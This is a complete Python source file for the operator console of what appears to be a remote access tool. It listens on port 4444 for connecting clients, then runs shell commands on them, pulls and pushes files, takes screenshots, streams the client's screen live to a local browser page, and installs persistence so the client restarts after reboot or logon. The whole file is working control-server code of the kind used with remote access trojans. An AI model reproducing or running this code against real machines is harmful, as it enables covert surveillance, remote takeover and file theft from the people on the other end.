# controller.py - v9 (persistent + screenshare + screenshot + capture diagnostics)

import base64
import http.server
import json
import os
import socket
import subprocess
import sys
import threading
import time

HOST = '0.0.0.0'
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
MAX_FILE = 50 * 1024 * 1024  # 50 MB


def recv_exact(conn, n):
    chunks = []
    while n > 0:
        chunk = conn.recv(min(n, 65536))
        if not chunk:
            return None
        chunks.append(chunk)
        n -= len(chunk)
    return b''.join(chunks)


def send_msg(conn, obj):
    payload = json.dumps(obj).encode('utf-8')
    conn.sendall(len(payload).to_bytes(4, 'big') + payload)


def recv_msg(conn):
    try:
        header = recv_exact(conn, 4)
        if header is None:
            return None
        payload = recv_exact(conn, int.from_bytes(header, 'big'))
        if payload is None:
            return None
        return json.loads(payload.decode('utf-8'))
    except (OSError, ValueError):
        return None


def strip_quotes(text):
    if len(text) >= 2 and text[0] == text[-1] and text[0] in ('"', "'"):
        return text[1:-1]
    return text


CLIENT_ENV = {}          # environment report from the connected client (hello)

CAPTURE_HELPERS = {
    'pillow': 'Pillow',
    'pyautogui': 'pyautogui',
    'grim': 'grim',
    'spectacle': 'spectacle',
    'gnome_screenshot': 'gnome-screenshot',
    'gnome_dbus': 'gnome-shell (built-in)',
    'imagemagick': 'ImageMagick',
}

# Install package name per helper and package-manager family
CAPTURE_PACKAGES = {
    'pacman': {'pillow': 'python-pillow', 'grim': 'grim', 'spectacle': 'spectacle',
               'gnome_screenshot': 'gnome-screenshot', 'imagemagick': 'imagemagick'},
    'apt': {'pillow': 'python3-pil', 'grim': 'grim', 'spectacle': 'spectacle',
            'gnome_screenshot': 'gnome-screenshot', 'imagemagick': 'imagemagick'},
    'dnf': {'pillow': 'python3-pillow', 'grim': 'grim', 'spectacle': 'spectacle',
            'gnome_screenshot': 'gnome-screenshot', 'imagemagick': 'ImageMagick'},
    'zypper': {'pillow': 'python3-Pillow', 'grim': 'grim', 'spectacle': 'spectacle',
               'gnome_screenshot': 'gnome-screenshot', 'imagemagick': 'ImageMagick'},
}

PM_COMMAND = {
    'pacman': 'sudo pacman -S {}',
    'apt': 'sudo apt install {}',
    'dnf': 'sudo dnf install {}',
    'zypper': 'sudo zypper install {}',
}

# distro ID (from the client's /etc/os-release) -> package-manager family
DISTRO_FAMILY = {
    'arch': 'pacman', 'omarchy': 'pacman', 'manjaro': 'pacman', 'endeavouros': 'pacman',
    'garuda': 'pacman', 'cachyos': 'pacman', 'artix': 'pacman',
    'ubuntu': 'apt', 'debian': 'apt', 'kali': 'apt', 'linuxmint': 'apt', 'lmde': 'apt',
    'pop': 'apt', 'zorin': 'apt', 'elementary': 'apt', 'raspbian': 'apt', 'devuan': 'apt',
    'fedora': 'dnf', 'nobara': 'dnf', 'rhel': 'dnf', 'centos': 'dnf', 'rocky': 'dnf',
    'almalinux': 'dnf', 'ol': 'dnf',
    'opensuse-leap': 'zypper', 'opensuse-tumbleweed': 'zypper', 'opensuse': 'zypper',
    'sles': 'zypper',
}


def capture_ok(env):
    """Best guess whether screen capture can work on the client right now."""
    if not env:
        return True            # unknown (older client) - do not warn
    if (env.get('os') or '') == 'linux' and (env.get('session') or '') == 'none':
        return False
    helpers = env.get('helpers') or {}
    if any(helpers.get(k) for k in ('pillow', 'pyautogui', 'grim', 'spectacle',
                                    'gnome_screenshot', 'imagemagick')):
        return True
    return 'gnome' in (env.get('desktop') or '').lower() and bool(helpers.get('gnome_dbus'))


def fix_capture_lines(env, category=None):
    """'How to fix screen capture on the client' lines, tailored to its OS,
    distro, session and the helpers it is missing."""
    env = env or {}
    os_name = (env.get('os') or '').lower()
    distro = (env.get('distro') or '').lower()
    name = env.get('distro_name') or 'the client'
    session = env.get('session') or ''
    desktop = (env.get('desktop') or '').lower()
    helpers = env.get('helpers') or {}
    lines = []

    if os_name == 'windows':
        lines.append("Screen capture needs Pillow on the Windows client.")
        lines.append("Run on the client:  py -m pip install pillow")
        lines.append("Then run the command again.")
        return lines

    if os_name and os_name != 'linux':
        lines.append("Install Pillow on the client (pip install pillow), then retry.")
        return lines

    if session == 'none':
        lines.append("The client has no graphical session (DISPLAY / WAYLAND_DISPLAY are not set).")
        lines.append("Start the client from a terminal inside the logged-in desktop, then retry.")
        return lines

    wanted = ['pillow']
    if session == 'wayland':
        if 'kde' in desktop:
            wanted.append('spectacle')
        elif 'gnome' in desktop:
            wanted.append('gnome_screenshot')
        else:
            wanted.append('grim')
    else:
        wanted.append('imagemagick')
    missing = [k for k in wanted if not helpers.get(k)]

    if category == 'all_failed':
        lines.append("Every capture method on the client failed (see the attempts above).")
    elif missing:
        lines.append("Screen capture dependencies are missing on the client ({}).".format(name))
    else:
        lines.append("Screen capture is failing on the client ({}) - see the attempts above.".format(name))

    if missing:
        family = DISTRO_FAMILY.get(distro)
        table = CAPTURE_PACKAGES.get(family, {})
        pkgs = [table[k] for k in missing if k in table]
        if pkgs and family in PM_COMMAND:
            lines.append("To fix, on the client:  {}".format(PM_COMMAND[family].format(' '.join(pkgs))))
        if 'pillow' in missing:
            lines.append("(without sudo:  python3 -m pip install --break-system-packages pillow)")

    if session == 'wayland':
        if 'kde' in desktop:
            lines.append("Tip: KDE captures via spectacle (it ships with Plasma).")
        elif 'gnome' in desktop:
            lines.append("Tip: GNOME screenshots work via gnome-screenshot / the built-in API.")
        else:
            lines.append("Tip: on Wayland, Hyprland/Sway need grim; KDE and GNOME have their own tools.")
    else:
        lines.append("Tip: on X11, Pillow alone is enough.")

    lines.append("After installing, run the command again - no client restart needed.")
    return lines


def print_capture_fix(diag):
    """Show what the client tried, plus how to fix it."""
    env = diag.get('env') or CLIENT_ENV or {}
    print("[!] Screen capture failed on the client. What was tried:")
    for attempt in diag.get('attempts') or []:
        print("      - {}".format(attempt))
    for line in fix_capture_lines(env, diag.get('category')):
        print("    " + line)


def print_client_error(msg):
    """One error line, plus the fix block when it was screen capture."""
    print("[!] Client error: {}".format(msg.get('data', '')))
    diag = msg.get('diag') or {}
    if diag.get('kind') == 'capture':
        print_capture_fix(diag)


def print_client_env(env):
    """Show what the client reported on connect, warning early when screen
    capture is missing dependencies."""
    if not env:
        return
    name = env.get('distro_name') or env.get('os') or 'unknown'
    session = env.get('session') or '?'
    desktop = env.get('desktop') or ''
    label = session
    if session == 'wayland' and desktop:
        label = 'wayland [{}]'.format(desktop)
    print("[+] Client environment: {} ({})".format(name, env.get('distro') or '?'))
    print("    Session: {} | Python {}".format(label, env.get('python') or '?'))
    helpers = env.get('helpers') or {}
    have = [pretty for key, pretty in CAPTURE_HELPERS.items() if helpers.get(key)]
    missing = [pretty for key, pretty in CAPTURE_HELPERS.items() if not helpers.get(key)]
    print("    Capture helpers: {} | missing: {}".format(
        ', '.join(have) if have else 'none',
        ', '.join(missing) if missing else 'none'))
    if not capture_ok(env):
        print("[!] Heads-up: screen capture is not ready on this client:")
        for line in fix_capture_lines(env, None):
            print("    " + line)


def _ingest_hello(msg):
    """Store and show the environment report a client sends on connect."""
    global CLIENT_ENV
    CLIENT_ENV = msg.get('env') or {}
    print_client_env(CLIENT_ENV)


def read_hello(conn):
    """Read the hello a fresh client sends right after connecting. A short
    timeout keeps older clients (which send none) from stalling us."""
    global CLIENT_ENV
    CLIENT_ENV = {}
    try:
        conn.settimeout(1.5)
        msg = recv_msg(conn)
    except OSError:
        msg = None
    finally:
        try:
            conn.settimeout(None)
        except OSError:
            pass
    if isinstance(msg, dict) and msg.get('type') == 'hello':
        _ingest_hello(msg)


def handle_reply(conn, save_as=None):
    """Read one reply from the client (hello updates are absorbed first).
    Returns False if the client is gone."""
    while True:
        reply = recv_msg(conn)
        if reply is None:
            print("[!] Client disconnected.")
            return False
        rtype = reply.get('type')
        if rtype == 'hello':                # a late hello - absorb it
            _ingest_hello(reply)
            continue
        break

    if rtype == 'output':
        print("[+] Received output: {}".format(reply.get('data', '')))
    elif rtype == 'error':
        print_client_error(reply)
    elif rtype == 'file':
        name = save_as or reply.get('name') or 'downloaded.bin'
        try:
            data = base64.b64decode(reply.get('data', ''))
            with open(name, 'wb') as f:
                f.write(data)
            print("[+] File saved: {} ({} bytes)".format(os.path.abspath(name), len(data)))
        except Exception as e:
            print("[!] Could not save file: {}".format(e))
    elif rtype == 'image':
        name = save_as or time.strftime('screenshot_%Y%m%d_%H%M%S.jpg')
        try:
            data = base64.b64decode(reply.get('data', ''))
            with open(name, 'wb') as f:
                f.write(data)
            path = os.path.abspath(name)
            print("[+] Screenshot saved: {} ({} bytes)".format(path, len(data)))
            if not os.environ.get('SCREEN_NO_BROWSER'):
                open_default_app(path)
        except Exception as e:
            print("[!] Could not save the screenshot: {}".format(e))
    else:
        print("[?] Unknown reply: {}".format(reply))
    return True


def exchange(conn, msg, save_as=None):
    """Send one message and read the reply. Returns False if the connection broke."""
    try:
        send_msg(conn, msg)
    except OSError:
        print("[!] Client disconnected.")
        return False
    return handle_reply(conn, save_as)


BROWSER_PAGE = b"""<!DOCTYPE html>
<html><head><title>Client screen (live)</title>
<style>
 body { margin:0; background:#101010; color:#ddd; font-family:sans-serif; text-align:center; }
 img { width:100%; max-width:1280px; }
 button { margin:10px; padding:8px 18px; font-size:14px; }
</style></head><body>
<h3>Live screen of the client</h3>
<img src="/stream" onerror="document.querySelector('h3').textContent='Stream ended - you can close this tab';">
<p><button onclick="fetch('/stop').then(()=>{document.querySelector('h3').textContent='stopping...'})">Stop sharing</button></p>
</body></html>
"""


class BrowserViewer:
    """Tiny local web server. Serves the newest received frame as an MJPEG
    stream so the controller's own browser can watch the client's screen."""

    def __init__(self):
        self.jpeg = None            # newest frame (already JPEG)
        self.seq = 0                # bumped on every new frame
        self.stop_requested = False
        self.cond = threading.Condition()
        self.server = None
        self.url = None

    def feed(self, jpeg):
        with self.cond:
            self.jpeg = jpeg
            self.seq += 1
            self.cond.notify_all()

    def start(self):
        viewer = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass                # keep the console quiet

            def do_GET(self):
                if self.path.startswith('/stream'):
                    self.send_response(200)
                    self.send_header('Content-Type', 'multipart/x-mixed-replace; boundary=frame')
                    self.send_header('Cache-Control', 'no-store')
                    self.end_headers()
                    self.connection.settimeout(15)
                    last = -1
                    try:
                        while not viewer.stop_requested:
                            with viewer.cond:
                                viewer.cond.wait_for(lambda: viewer.seq != last or viewer.stop_requested, timeout=1.0)
                                last = viewer.seq
                                frame = viewer.jpeg
                            if frame is None:
                                continue
                            self.wfile.write(b'--frame\r\nContent-Type: image/jpeg\r\nContent-Length: '
                                             + str(len(frame)).encode() + b'\r\n\r\n')
                            self.wfile.write(frame)
                            self.wfile.write(b'\r\n')
                    except OSError:
                        pass        # browser tab closed
                    return
                if self.path.startswith('/stop'):
                    viewer.stop_requested = True
                    with viewer.cond:
                        viewer.cond.notify_all()
                    body = b'<html><body><h3>Stopped. You can close this tab.</h3></body></html>'
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(BROWSER_PAGE)))
                self.end_headers()
                self.wfile.write(BROWSER_PAGE)

        self.server = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Handler)
        self.server.daemon_threads = True
        self.url = 'http://127.0.0.1:{}/'.format(self.server.server_address[1])
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def stop(self):
        self.stop_requested = True
        with self.cond:
            self.cond.notify_all()
        try:
            self.server.shutdown()
            self.server.server_close()
        except Exception:
            pass


def open_default_app(target):
    """Open a URL or file with the desktop's default app. False if that failed."""
    try:
        subprocess.Popen(['xdg-open', target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except OSError:
        pass
    try:
        import webbrowser
        return webbrowser.open(target)
    except Exception:
        return False


def announce_viewer(viewer, seconds=None):
    """Print the viewer's URL and try to open the browser - called only after
    the first frame arrived, so the page can never load into a dead server."""
    print("[+] Live view: {}".format(viewer.url))
    print("[+] No browser opened? Paste that URL into any browser to watch the live screen.")
    if not os.environ.get('SCREEN_NO_BROWSER'):
        open_default_app(viewer.url)      # silent attempt to pop the default browser
    print("[+] Streaming - press the Stop button in the page to stop.")
    if seconds:
        print("[+] Auto-stop after {} seconds.".format(seconds))


def start_screenshare(conn, fps=None, seconds=None):
    """Show the client's screen live in the controller's browser (MJPEG).
    Returns False if the client disconnected (so the caller waits for a new one)."""
    viewer = BrowserViewer()
    try:
        viewer.start()
    except Exception as e:
        print("[!] Could not start the local viewer: {}".format(e))
        return True

    request = {'type': 'screenshare'}
    if fps:
        request['fps'] = fps
    try:
        send_msg(conn, request)
    except OSError:
        viewer.stop()
        print("[!] Client disconnected.")
        return False

    print("[+] Waiting for the first frame from the client...")

    stopping = False
    frames = 0
    viewer_announced = False
    stream_start = time.time()

    def ask_stop():
        """Tell the client to stop streaming. False if it is gone."""
        try:
            send_msg(conn, {'type': 'screenshare_stop'})
            return True
        except OSError:
            print("[!] Client disconnected.")
            return False

    try:
        while True:
            header = recv_exact(conn, 4)
            if header is None:
                print("[!] Client disconnected.")
                return False
            size = int.from_bytes(header, 'big')
            if size > 20 * 1024 * 1024:
                print("[!] Frame too large ({} bytes), stopping the stream.".format(size))
                stopping = True
                if not ask_stop():
                    return False
                continue
            payload = recv_exact(conn, size)
            if payload is None:
                print("[!] Client disconnected.")
                return False

            if payload[:1] == b'{':                # JSON -> the stream is over
                try:
                    msg = json.loads(payload.decode('utf-8'))
                except ValueError:
                    msg = {}
                if msg.get('type') == 'error':
                    print_client_error(msg)
                else:
                    print("[+] Received output: {}".format(msg.get('data', '')))
                break

            if stopping:
                continue                            # drain frames still in flight

            if len(payload) >= 2 and payload[0] == 1:
                viewer.feed(payload[1:])            # JPEG frame -> browser
                frames += 1
                if not viewer_announced:
                    viewer_announced = True
                    announce_viewer(viewer, seconds)

            if viewer.stop_requested:
                stopping = True
                if not ask_stop():
                    return False
            elif seconds and (time.time() - stream_start) >= seconds:
                stopping = True
                if not ask_stop():
                    return False
    finally:
        viewer.stop()

    if frames:
        print("[+] Screen share ended ({} frames).".format(frames))
    return True


def serve(client_socket):
    """Serve commands until the client disconnects or the user types exit.
    Returns True if the user asked to stop, False if the client disconnected."""
    print("[+] Shell commands run on the client (cd persists now).")
    print("[+] Extra commands:  screenshare [fps] [seconds]   (live view opens in your browser)")
    print("[+]                   screenshot [save_as]           (one picture from the client)")
    print("[+]                   persist | unpersist           (client auto-starts after reboot/logon)")
    print("[+]                   download <client_path> [save_as]  |  upload <local_path>  |  exit")

    while True:
        try:
            line = input("controller> ").strip()
        except EOFError:
            return True  # stdin closed -> shut down

        if not line:
            continue

        if line in ('exit', 'quit'):
            exchange(client_socket, {'type': 'exit'})
            return True

        if line.startswith('download '):
            parts = line.split(maxsplit=2)
            remote_path = strip_quotes(parts[1])
            save_as = strip_quotes(parts[2]) if len(parts) > 2 else None
            if not exchange(client_socket, {'type': 'download', 'path': remote_path}, save_as):
                return False
            continue

        if line.startswith('upload '):
            local_path = strip_quotes(line.split(maxsplit=1)[1].strip())
            try:
                size = os.path.getsize(local_path)
            except OSError as e:
                print("[!] Could not read local file: {}".format(e))
                continue
            if size > MAX_FILE:
                print("[!] File too large to send (max {} MB).".format(MAX_FILE // (1024 * 1024)))
                continue
            try:
                with open(local_path, 'rb') as f:
                    data = base64.b64encode(f.read()).decode('ascii')
            except OSError as e:
                print("[!] Could not read local file: {}".format(e))
                continue
            if not exchange(client_socket, {'type': 'upload', 'name': os.path.basename(local_path), 'data': data}):
                return False
            continue

        if line == 'screenshot' or line.startswith('screenshot '):
            parts = line.split(maxsplit=1)
            save_as = strip_quotes(parts[1].strip()) if len(parts) > 1 else None
            if save_as and '.' not in os.path.basename(save_as):
                save_as += '.jpg'
            if not exchange(client_socket, {'type': 'screenshot'}, save_as):
                return False
            continue

        if line in ('persist', 'unpersist'):
            if not exchange(client_socket, {'type': line}):
                return False
            continue

        if line == 'screenshare' or line.startswith('screenshare '):
            parts = line.split()
            fps = None
            seconds = None
            if len(parts) > 1:
                try:
                    fps = int(parts[1])
                except ValueError:
                    fps = None
            if len(parts) > 2:
                try:
                    seconds = float(parts[2])
                    if seconds <= 0:
                        seconds = None
                except ValueError:
                    seconds = None
            try:
                if not start_screenshare(client_socket, fps, seconds):
                    return False
            except OSError as e:
                print("[!] Connection lost: {}".format(e))
                return False
            continue

        # anything else is a shell command for the client
        if not exchange(client_socket, {'type': 'cmd', 'data': line}):
            return False


def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Allow rebinding even when a previous connection is stuck in TIME-WAIT,
    # otherwise restarting quickly fails with "[Errno 98] Address already in use"
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((HOST, PORT))
    except OSError as e:
        print("[!] Could not bind port {}: {}".format(PORT, e))
        print("[!] Another controller is probably still running on this machine.")
        print("[!] Find it with:  pgrep -af controller.py")
        print("[!] Stop it with:  kill <PID>")
        return

    server_socket.listen(5)
    print("[+] Controller v9 listening on port {}".format(PORT))

    try:
        # Outer loop: keep accepting clients forever (Ctrl+C or 'exit' to stop)
        while True:
            print("[+] Waiting for a client to connect...")
            client_socket, addr = server_socket.accept()
            print("[+] Client connected: {}".format(addr))
            read_hello(client_socket)
            try:
                stop = serve(client_socket)
            finally:
                client_socket.close()
            if stop:
                break
            # client disconnected -> just wait for the next one
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        server_socket.close()
        print("[+] Controller closed.")


if __name__ == "__main__":
    main()
